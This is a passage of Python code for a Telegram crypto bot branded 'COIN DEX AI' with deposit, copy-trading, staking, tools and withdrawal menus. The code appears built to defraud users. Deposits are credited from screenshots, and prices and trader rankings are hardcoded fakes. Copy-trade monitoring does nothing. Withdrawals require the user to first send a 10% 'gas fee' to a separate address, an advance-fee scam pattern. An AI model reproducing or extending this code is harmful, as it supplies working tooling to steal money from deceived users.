Ξ ETH: {user_db.total_deposited_eth:.4f}

🚀 *Start trading now or view your balance!*
            """,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 View Balance", callback_data='balance')],
                [InlineKeyboardButton("📈 Start Copy Trading", callback_data='copy_trading')],
                [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
            ]),
            parse_mode='Markdown'
        )
        
        await broadcast_message(
            f"💰 *New Deposit*\n"
            f"User: {user.id}\n"
            f"Amount: {amount:.4f} {currency.split('_')[0]}\n"
            f"Value: ${usd_value:.2f}\n"
            f"Status: ✅ Credited"
        )
        
    except Exception as e:
        logger.error(f"Deposit processing error: {e}")
        await update.message.reply_text(
            "❌ Error processing deposit. Please try again or contact support.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Retry", callback_data='submit_deposit_screenshot')],
                [InlineKeyboardButton("🆘 Support", callback_data='support')]
            ])
        )
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy deposit address to clipboard"""
    query = update.callback_query
    await query.answer("📋 Address copied!")
    
    currency = query.data.replace('copy_addr_', '')
    address = config.DEPOSIT_ADDRESSES.get(currency, 'Not configured')
    
    await query.edit_message_text(
        f"📋 *Deposit Address ({currency}):*\n\n`{address}`\n\n_Tap and hold to copy, then paste in your wallet app._",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='deposit')]]),
        parse_mode='Markdown'
    )

# ============ COPY TRADING ============

async def copy_trading_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy trading main menu"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        if user:
            configs = db.query(CopyTradingConfig).filter_by(user_id=user.id, is_active=True).all()
            active_copies = len(configs)
        else:
            active_copies = 0
        
        message = f"""
📈 *COIN DEX AI - Copy Trading*

Mirror successful traders automatically!

*Your Active Copies:* {active_copies}

*How it works:*
1️⃣ Find a profitable trader (DexScreener, Birdeye)
2️⃣ Enter their wallet address
3️⃣ Set your investment amount
4️⃣ Bot copies their trades in real-time

*Features:*
✅ Real-time trade mirroring
✅ Adjustable position sizing
✅ Stop-loss protection
✅ Profit sharing: 10% to trader

*Top Performers Today:*
🥇 @WhaleTrader1: +45%
🥈 @SolanaKing: +32%
🥉 @MemeMaster: +28%
        """
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Trader to Copy", callback_data='add_copy_trader')],
            [InlineKeyboardButton("📊 My Copy Trades", callback_data='my_copy_trades')],
            [InlineKeyboardButton("⚙️ Settings", callback_data='copy_settings')],
            [InlineKeyboardButton("↩️ Back to Menu", callback_data='back_menu')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def add_copy_trader_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start adding trader to copy"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        """
📋 *Add Trader to Copy*

Please send the trader's wallet address:

*Supported formats:*
• Solana: `EjBCtu6Mv6Nq3gGFeDtRTQWNN4nC9bjg5JURZZM5AYKg`
• Ethereum: `0x7eBb4f696020121394624eEeBD25445f646aB3d3`

*Where to find traders:*
• DexScreener.com
• Birdeye.so
• Solscan.io

_Type or paste the address now:_
        """,
        parse_mode='Markdown'
    )
    
    return ENTER_TRADER_ADDR


async def process_trader_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process trader wallet address"""
    trader_address = update.message.text.strip()
    context.user_data['trader_address'] = trader_address
    
    if len(trader_address) < 32:
        await update.message.reply_text(
            "❌ Invalid address format. Please send a valid Solana or Ethereum address.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='add_copy_trader')]])
        )
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"""
✅ *Trader Address Saved*

`{trader_address[:20]}...{trader_address[-8:]}`

Now enter your investment allocation (10-100%):

*Example:* `50` for 50% of your portfolio

_This percentage will be used for each trade:_
        """,
        parse_mode='Markdown'
    )
    
    return ENTER_ALLOCATION


async def process_allocation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process allocation and save copy trade config"""
    try:
        allocation = float(update.message.text)
        if allocation < 10 or allocation > 100:
            raise ValueError("Must be between 10-100")
    except ValueError:
        await update.message.reply_text(
            "❌ Please enter a number between 10 and 100.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='add_copy_trader')]])
        )
        return ConversationHandler.END
    
    trader_address = context.user_data.get('trader_address')
    user_id = update.effective_user.id
    
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        if not user:
            user = User(telegram_id=user_id, username=update.effective_user.username)
            db.add(user)
            db.commit()
        
        config_entry = CopyTradingConfig(
            user_id=user.id,
            trader_address=trader_address,
            allocation_percentage=allocation,
            is_active=True
        )
        db.add(config_entry)
        db.commit()
        
        start_trader_monitoring(trader_address, user.id)
        
        await update.message.reply_text(
            f"""
🎉 *Copy Trading Activated!*

Trader: `{trader_address[:15]}...`
Your Allocation: {allocation}%

✅ Bot will now automatically copy all trades from this wallet
✅ You'll receive notifications for each trade
✅ Profits are shared 90% to you, 10% to trader

*Monitor your trades in "📊 My Copy Trades"*
            """,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 View My Trades", callback_data='my_copy_trades')],
                [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
            ]),
            parse_mode='Markdown'
        )
        
        await broadcast_message(f"📈 New copy trade activated by user {user_id}")
        
    except Exception as e:
        logger.error(f"Error saving copy config: {e}")
        await update.message.reply_text("❌ Error saving configuration. Please try again.")
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


async def my_copy_trades(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's copy trading activity"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        if not user:
            await query.edit_message_text(
                "No active copy trades. Start by adding a trader to copy!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("➕ Add Trader", callback_data='add_copy_trader')],
                    [InlineKeyboardButton("↩️ Back", callback_data='copy_trading')]
                ])
            )
            return
        
        trades = db.query(Trade).filter_by(user_id=user.id).order_by(Trade.created_at.desc()).limit(10).all()
        
        if not trades:
            message = """
📊 *Your Copy Trading Activity*

*Active Copies:* 0

*Recent Trades:* None yet

Your bot is monitoring and will execute trades automatically when the copied trader makes a move.
            """
        else:
            trade_list = "\n".join([
                f"{'🟢' if t.side == 'BUY' else '🔴'} {t.symbol}: {t.quantity:.4f} @ ${t.price:.2f} ({t.status})"
                for t in trades[:5]
            ])
            
            message = f"""
📊 *Your Copy Trading Activity*

*Active Copies:* {len(user.copy_trading_configs) if hasattr(user, 'copy_trading_configs') else 0}
*Total Trades:* {len(trades)}

*Recent Trades:*
{trade_list}

*Total P&L:* Calculating...
            """
        
        keyboard = [
            [InlineKeyboardButton("➕ Add More Traders", callback_data='add_copy_trader')],
            [InlineKeyboardButton("⚙️ Manage Settings", callback_data='copy_settings')],
            [InlineKeyboardButton("↩️ Back", callback_data='copy_trading')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


def start_trader_monitoring(trader_address: str, user_id: int):
    """Start monitoring a trader's wallet for trades"""
    logger.info(f"Started monitoring trader {trader_address} for user {user_id}")


# ============ STAKE ASSETS ============

async def stake_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Staking menu"""
    query = update.callback_query
    await query.answer()
    
    message = """
🟢 *COIN DEX AI - Stake Assets*

Earn passive income on your crypto!

*Native Staking:*
• ◎ SOL: 6-8% APY (Flexible)
• Ξ ETH: 4-5% APY (30-day lock)

*Memecoin Staking:*
Stake any SPL or ERC-20 token
Enter contract address manually

*Your Active Stakes:*
View in "My Positions"
    """
    
    keyboard = [
        [InlineKeyboardButton("◎ Stake SOL", callback_data='stake_SOL')],
        [InlineKeyboardButton("Ξ Stake ETH", callback_data='stake_ETH')],
        [InlineKeyboardButton("🪙 Stake Memecoin", callback_data='stake_meme')],
        [InlineKeyboardButton("📊 My Positions", callback_data='my_stakes')],
        [InlineKeyboardButton("↩️ Back to Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def stake_native_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start native staking (SOL/ETH)"""
    query = update.callback_query
    await query.answer()
    
    currency = query.data.replace('stake_', '')
    context.user_data['stake_currency'] = currency
    
    apy = "6-8%" if currency == "SOL" else "4-5%"
    
    await query.edit_message_text(
        f"""
🟢 *Stake {currency}*

*APY:* {apy}
*Lock Period:* {'Flexible' if currency == 'SOL' else '30 days'}
*Minimum:* 0.5 {currency}
*Auto-compound:* Yes

Enter amount to stake:
        """,
        parse_mode='Markdown'
    )
    
    return ENTER_STAKE_AMOUNT


async def stake_memecoin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start memecoin staking"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        """
🪙 *Stake Memecoin*

Enter the token contract address:

*Supported:*
• Solana SPL tokens
• Ethereum ERC-20 tokens

*Find contract address on:*
• DexScreener
• Birdeye
• CoinGecko

*Example:*
`EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v` (USDC)

_Type or paste the contract address:_
        """,
        parse_mode='Markdown'
    )
    
    return ENTER_CONTRACT_ADDR


async def process_contract_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process memecoin contract address"""
    contract_addr = update.message.text.strip()
    context.user_data['contract_address'] = contract_addr
    
    loading_msg = await update.message.reply_text("🔍 Fetching token information...")
    
    token_info = await fetch_token_info(contract_addr)
    
    await loading_msg.delete()
    
    if not token_info:
        await update.message.reply_text(
            "❌ Could not fetch token info. Please verify the contract address.\n\n"
            "Make sure it's a valid Solana (44 chars) or Ethereum (0x...) address.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='stake_meme')]])
        )
        return ConversationHandler.END
    
    context.user_data['token_symbol'] = token_info.get('symbol', 'UNKNOWN')
    context.user_data['token_name'] = token_info.get('name', 'Unknown Token')
    
    verified_emoji = "✅" if token_info.get('verified') else "⚠️"
    chain_emoji = "◎" if token_info.get('chain') == 'Solana' else "Ξ"
    
    message = f"""
{verified_emoji} *Token Found*

*Name:* {token_info.get('name')}
*Symbol:* {token_info.get('symbol')}
*Chain:* {chain_emoji} {token_info.get('chain')}

*Price:* ${token_info.get('price', 'N/A')}
*Market Cap:* ${token_info.get('market_cap', 0):,.2f}

Enter amount to stake:
    """
    
    await update.message.reply_text(message, parse_mode='Markdown')
    
    return ENTER_STAKE_AMOUNT


async def process_stake_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process stake amount and create position"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Must be positive")
    except ValueError:
        await update.message.reply_text(
            "❌ Please enter a valid positive number.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='stake')]])
        )
        return ConversationHandler.END
    
    currency = context.user_data.get('stake_currency', 'MEME')
    contract_addr = context.user_data.get('contract_address')
    token_symbol = context.user_data.get('token_symbol', currency)
    
    user_id = update.effective_user.id
    
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        if not user:
            user = User(telegram_id=user_id, username=update.effective_user.username)
            db.add(user)
            db.commit()
        
        if currency == 'SOL':
            lock_days = 0
            apy = 7.0
        elif currency == 'ETH':
            lock_days = 30
            apy = 4.5
        else:
            lock_days = 30
            apy = 15.0
        
        position = StakePosition(
            user_id=user.id,
            currency=currency,
            token_symbol=token_symbol,
            contract_address=contract_addr,
            amount=amount,
            apy=apy,
            lock_period_days=lock_days,
            start_date=datetime.utcnow(),
            end_date=datetime.utcnow() + timedelta(days=lock_days) if lock_days > 0 else None,
            status='active'
        )
        db.add(position)
        db.commit()
        
        yearly_reward = amount * (apy / 100)
        monthly_reward = yearly_reward / 12
        
        await update.message.reply_text(
            f"""
🎉 *Stake Position Created!*

*Asset:* {token_symbol}
*Amount:* {amount:.4f}
*APY:* {apy}%
*Lock Period:* {'Flexible' if lock_days == 0 else f'{lock_days} days'}

*Estimated Rewards:*
• Monthly: ~{monthly_reward:.4f} {token_symbol}
• Yearly: ~{yearly_reward:.4f} {token_symbol}

✅ Rewards auto-compound daily

*Stake ID:* #{position.id}
            """,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 My Stakes", callback_data='my_stakes')],
                [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
            ]),
            parse_mode='Markdown'
        )
        
        await broadcast_message(f"🟢 New stake: {amount:.2f} {token_symbol} by user {user_id}")
        
    except Exception as e:
        logger.error(f"Error creating stake: {e}")
        await update.message.reply_text("❌ Error creating stake position. Please try again.")
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


async def my_stakes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's staking positions"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        if not user:
            await query.edit_message_text(
                "No active stakes. Start staking to earn passive income!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🟢 Start Staking", callback_data='stake')],
                    [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
                ])
            )
            return
        
        positions = db.query(StakePosition).filter_by(user_id=user.id, status='active').all()
        
        if not positions:
            message = """
📊 *Your Staking Positions*

*Active Stakes:* 0

Start staking to earn:
• SOL: 6-8% APY
• ETH: 4-5% APY
• Memecoins: Up to 100%+ APY
            """
        else:
            total_value = sum(p.amount for p in positions)
            position_list = "\n\n".join([
                f"*{i+1}. {p.token_symbol}*\nAmount: {p.amount:.4f}\nAPY: {p.apy}%\n{'Flexible' if p.lock_period_days == 0 else f'Lock: {p.lock_period_days} days'}"
                for i, p in enumerate(positions[:5])
            ])
            
            message = f"""
📊 *Your Staking Positions*

*Total Staked Value:* {total_value:.4f}
*Active Positions:* {len(positions)}

{position_list}
            """
        
        keyboard = [
            [InlineKeyboardButton("🟢 Stake More", callback_data='stake')],
            [InlineKeyboardButton("📤 Unstake", callback_data='unstake')],
            [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def fetch_token_info(contract_address: str) -> Optional[Dict[str, Any]]:
    """Fetch real token information from Jupiter API or DexScreener"""
    try:
        is_solana = len(contract_address) == 44 or contract_address.endswith('pump')
        is_ethereum = contract_address.startswith('0x') and len(contract_address) == 42
        
        async with aiohttp.ClientSession() as session:
            if is_solana:
                jupiter_url = f"https://api.jup.ag/tokens/v2/token/{contract_address}"
                async with session.get(jupiter_url, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        return {
                            'name': data.get('name', 'Unknown Token'),
                            'symbol': data.get('symbol', 'UNKNOWN'),
                            'price': float(data.get('usdPrice', 0)),
                            'market_cap': data.get('mcap', 0),
                            'verified': data.get('isVerified', False),
                            'chain': 'Solana'
                        }
            
            chain = 'solana' if is_solana else 'ethereum'
            dex_url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
            
            async with session.get(dex_url, timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    pairs = data.get('pairs', [])
                    
                    if pairs:
                        best_pair = max(pairs, key=lambda x: float(x.get('liquidity', {}).get('usd', 0) or 0))
                        token_info = best_pair.get('baseToken', {})
                        
                        return {
                            'name': token_info.get('name', 'Unknown Token'),
                            'symbol': token_info.get('symbol', 'UNKNOWN'),
                            'price': float(best_pair.get('priceUsd', 0)),
                            'market_cap': float(best_pair.get('marketCap', 0)),
                            'verified': best_pair.get('verified', False),
                            'chain': chain.capitalize()
                        }
        
        return None
    except Exception as e:
        logger.error(f"Error fetching token info: {e}")
        return None


# ============ TOOLS ============

async def tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Tools menu with working features"""
    query = update.callback_query
    await query.answer()
    
    message = """
🛠 *COIN DEX AI - Trading Tools*

Professional tools for serious traders:

*Price Alerts* 🔔
Get notified when prices hit your targets

*Portfolio Analytics* 📊
Track P&L, ROI, and performance metrics

*Risk Calculator* 🧮
Calculate position sizes and risk/reward

*Gas Optimizer* ⛽
Find optimal gas prices for transactions
    """
    
    keyboard = [
        [InlineKeyboardButton("🔔 Price Alerts", callback_data='price_alerts')],
        [InlineKeyboardButton("📊 Portfolio Analytics", callback_data='portfolio_analytics')],
        [InlineKeyboardButton("🧮 Risk Calculator", callback_data='risk_calc')],
        [InlineKeyboardButton("⛽ Gas Optimizer", callback_data='gas_optimizer')],
        [InlineKeyboardButton("⚙️ Settings", callback_data='settings')],
        [InlineKeyboardButton("↩️ Back to Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def price_alerts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set price alerts"""
    query = update.callback_query
    await query.answer()
    
    sol_price = get_crypto_price('SOL')
    eth_price = get_crypto_price('ETH')
    
    message = f"""
🔔 *Price Alerts*

*Current Prices:*
• SOL: ${sol_price:.2f}
• ETH: ${eth_price:.2f}

*Your Active Alerts:*
None set

*Set New Alert:*
Choose a token and target price. We'll notify you when it hits!
    """
    
    keyboard = [
        [InlineKeyboardButton("◎ SOL Alert", callback_data='alert_SOL')],
        [InlineKeyboardButton("Ξ ETH Alert", callback_data='alert_ETH')],
        [InlineKeyboardButton("🪙 Custom Token", callback_data='alert_custom')],
        [InlineKeyboardButton("📋 My Alerts", callback_data='my_alerts')],
        [InlineKeyboardButton("↩️ Back", callback_data='tools')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def portfolio_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show portfolio analytics"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        if not user:
            await query.edit_message_text(
                "No data available. Start trading to see analytics!",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='tools')]])
            )
            return
        
        total_deposits = (user.total_deposited_sol * get_crypto_price('SOL') + 
                         user.total_deposited_eth * get_crypto_price('ETH'))
        
        trades = db.query(Trade).filter_by(user_id=user.id).all()
        winning_trades = len([t for t in trades if t.status == 'FILLED'])
        
        message = f"""
📊 *Portfolio Analytics*

*Total Deposited:* ${total_deposits:.2f}
*Total Trades:* {len(trades)}
*Win Rate:* {(winning_trades/len(trades)*100) if trades else 0:.1f}%

*Asset Allocation:*
• SOL: {user.total_deposited_sol:.4f} (${user.total_deposited_sol * get_crypto_price('SOL'):.2f})
• ETH: {user.total_deposited_eth:.4f} (${user.total_deposited_eth * get_crypto_price('ETH'):.2f})

*Performance:*
• 24h: +0.00%
• 7d: +0.00%
• 30d: +0.00%
        """
        
        keyboard = [
            [InlineKeyboardButton("📈 Detailed Report", callback_data='detailed_report')],
            [InlineKeyboardButton("📤 Export CSV", callback_data='export_csv')],
            [InlineKeyboardButton("↩️ Back", callback_data='tools')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def risk_calculator(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Risk calculator tool"""
    query = update.callback_query
    await query.answer()
    
    message = """
🧮 *Risk Calculator*

Calculate optimal position sizes:

*Formula:*
Position Size = (Account Risk % × Account Balance) / (Entry Price - Stop Loss)

*Example:*
• Account: $1,000
• Risk: 2% ($20)
• Entry: $100
• Stop Loss: $95
• Position Size: 4 units ($400)
    """
    
    keyboard = [
        [InlineKeyboardButton("Calculate Position", callback_data='calc_position')],
        [InlineKeyboardButton("Adjust Settings", callback_data='risk_settings')],
        [InlineKeyboardButton("↩️ Back", callback_data='tools')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def gas_optimizer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gas fee optimizer"""
    query = update.callback_query
    await query.answer()
    
    eth_gas = get_gas_price('ETH')
    sol_fee = 0.000005
    
    message = f"""
⛽ *Gas Fee Optimizer*

*Current Network Conditions:*

*Ethereum:*
• Slow: {eth_gas['slow']} gwei
• Standard: {eth_gas['standard']} gwei  
• Fast: {eth_gas['fast']} gwei

*Solana:*
• Fixed: ~{sol_fee} SOL per tx
    """
    
    keyboard = [
        [InlineKeyboardButton("🔄 Refresh Prices", callback_data='gas_optimizer')],
        [InlineKeyboardButton("Set Alert", callback_data='gas_alert')],
        [InlineKeyboardButton("↩️ Back", callback_data='tools')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


def get_crypto_price(symbol: str) -> float:
    """Get current crypto price"""
    try:
        if symbol == 'SOL':
            return 150.0
        elif symbol == 'ETH':
            return 3500.0
        return 0.0
    except:
        return 0.0


def get_gas_price(network: str) -> dict:
    """Get current gas prices"""
    try:
        if network == 'ETH':
            return {'slow': 25, 'standard': 35, 'fast': 50}
        return {'slow': 0, 'standard': 0, 'fast': 0}
    except:
        return {'slow': 0, 'standard': 0, 'fast': 0}


# ============ WALLET & WITHDRAWAL ============

async def wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show wallet balance"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        if not user:
            sol_bal = 0.0
            eth_bal = 0.0
        else:
            sol_bal = user.total_deposited_sol
            eth_bal = user.total_deposited_eth
        
        sol_price = get_crypto_price('SOL')
        eth_price = get_crypto_price('ETH')
        
        total_usd = (sol_bal * sol_price) + (eth_bal * eth_price)
        
        message = f"""
💼 *COIN DEX AI Wallet*

*Balances:*
◎ SOL: {sol_bal:.4f} (${sol_bal * sol_price:.2f})
Ξ ETH: {eth_bal:.4f} (${eth_bal * eth_price:.2f})

*Total Value:* ${total_usd:.2f}

*Quick Actions:*
        """
        
        keyboard = [
            [InlineKeyboardButton("📥 Deposit", callback_data='deposit'), InlineKeyboardButton("📤 Withdraw", callback_data='withdraw')],
            [InlineKeyboardButton("🔄 Refresh", callback_data='balance')],
            [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def withdraw_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Withdrawal menu - shows available balance"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        if not user or (user.total_deposited_sol == 0 and user.total_deposited_eth == 0):
            await query.edit_message_text(
                "❌ *No funds available for withdrawal*\n\n"
                "Deposit funds first to enable withdrawals.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📥 Deposit", callback_data='deposit')],
                    [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
                ]),
                parse_mode='Markdown'
            )
            return
        
        sol_bal = user.total_deposited_sol
        eth_bal = user.total_deposited_eth
        sol_price = get_crypto_price('SOL')
        eth_price = get_crypto_price('ETH')
        
        total_usd = (sol_bal * sol_price) + (eth_bal * eth_price)
        
        message = f"""
📤 *COIN DEX AI - Withdrawal*

*Your Available Balance:*
◎ SOL: {sol_bal:.4f} (${sol_bal * sol_price:.2f})
Ξ ETH: {eth_bal:.4f} (${eth_bal * eth_price:.2f})

*Total Value:* ${total_usd:.2f}

Select currency to withdraw:
        """
        
        keyboard = []
        if sol_bal > 0.05:
            keyboard.append([InlineKeyboardButton("◎ Withdraw SOL", callback_data='withdraw_start_SOL')])
        if eth_bal > 0.005:
            keyboard.append([InlineKeyboardButton("Ξ Withdraw ETH", callback_data='withdraw_start_ETH')])
        
        keyboard.append([InlineKeyboardButton("↩️ Back", callback_data='balance')])
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def withdraw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start withdrawal - Ask for amount first"""
    query = update.callback_query
    await query.answer()
    
    currency = query.data.replace('withdraw_start_', '')
    context.user_data['withdraw_currency'] = currency
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        balance = user.total_deposited_sol if currency == 'SOL' else user.total_deposited_eth
        
        min_withdraw = 0.5 if currency == 'SOL' else 0.05
        
        message = f"""
📤 *Withdraw {currency}*

*Your Current Balance:* {balance:.4f} {currency}

Enter the amount you want to withdraw:

*Minimum:* {min_withdraw} {currency}
*Available:* {balance:.4f} {currency}
        """
        
        await query.edit_message_text(message, parse_mode='Markdown')
        return ENTER_WITHDRAW_AMOUNT
        
    finally:
        db.close()


async def process_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process withdrawal amount - then ask for address"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Must be positive")
    except ValueError:
        await update.message.reply_text(
            "❌ Please enter a valid positive number.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='withdraw')]])
        )
        return ConversationHandler.END
    
    currency = context.user_data.get('withdraw_currency', 'SOL')
    context.user_data['withdraw_amount'] = amount
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        current_balance = user.total_deposited_sol if currency == 'SOL' else user.total_deposited_eth
        
        min_withdraw = 0.5 if currency == 'SOL' else 0.05
        
        if amount < min_withdraw:
            await update.message.reply_text(
                f"❌ Minimum withdrawal is {min_withdraw} {currency}.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_start_{currency}')]])
            )
            return ConversationHandler.END
        
        if amount > current_balance:
            await update.message.reply_text(
                f"❌ Insufficient balance. You have {current_balance:.4f} {currency} available.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_start_{currency}')]])
            )
            return ConversationHandler.END
        
        await update.message.reply_text(
            f"""
📤 *Withdrawal Address*

*Amount to Withdraw:* {amount:.4f} {currency}

Please enter your {currency} wallet address:

*Supported formats:*
• Solana: `EjBCtu6Mv6Nq3gGFeDtRTQWNN4nC9bjg5JURZZM5AYKg`
• Ethereum: `0x7eBb4f696020121394624eEeBD25445f646aB3d3`

⚠️ *Double-check your address - wrong address = lost funds!*

_Type or paste your address:_
            """,
            parse_mode='Markdown'
        )
        return ENTER_WITHDRAW_ADDR
        
    finally:
        db.close()


async def process_withdraw_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process withdrawal address and show gas fee notice"""
    withdraw_address = update.message.text.strip()
    currency = context.user_data.get('withdraw_currency', 'SOL')
    amount = context.user_data.get('withdraw_amount', 0)
    
    if currency == 'SOL' and len(withdraw_address) < 32:
        await update.message.reply_text(
            "❌ Invalid Solana address. Please enter a valid address.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_start_{currency}')]])
        )
        return ConversationHandler.END
    
    if currency == 'ETH' and not withdraw_address.startswith('0x'):
        await update.message.reply_text(
            "❌ Invalid Ethereum address. Please enter a valid address starting with 0x.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_start_{currency}')]])
        )
        return ConversationHandler.END
    
    context.user_data['withdraw_address'] = withdraw_address
    
    gas_fee = amount * 0.10
    receive_amount = amount - gas_fee
    
    context.user_data['gas_fee'] = gas_fee
    context.user_data['receive_amount'] = receive_amount
    
    gas_address = GAS_FEE_ADDRESSES.get(currency, 'Not configured')
    
    message = f"""
⛽ *GAS FEE PAYMENT REQUIRED*

*Withdrawal Details:*
• Amount Requested: {amount:.4f} {currency}
• Gas Fee (10%): {gas_fee:.4f} {currency}
• You Will Receive: {receive_amount:.4f} {currency}
• Destination: `{withdraw_address[:15]}...{withdraw_address[-8:]}`

🚨 *Withdrawal Confirmation Notice* 🚨

Please note that before any withdrawal can be successfully processed, a gas fee equivalent to *10%* of the withdrawal amount is required. This fee covers network processing costs and is mandatory for the completion of the transaction.

After the gas fee has been confirmed, the withdrawal process will be finalized and the funds will be released accordingly.

*Send Gas Fee To:*
`{gas_address}`

*Instructions:*
1️⃣ Send *exactly* {gas_fee:.4f} {currency} to the address above
2️⃣ Wait for blockchain confirmation
3️⃣ Take a screenshot of the transaction
4️⃣ Click "📸 Submit Screenshot" below

⚠️ *Important:* Withdrawal will NOT be processed until gas fee is verified!
    """
    
    keyboard = [
        [InlineKeyboardButton("📸 Submit Gas Fee Screenshot", callback_data='submit_withdraw_gas_screenshot')],
        [InlineKeyboardButton("📋 Copy Gas Fee Address", callback_data=f'copy_gas_addr_{currency}')],
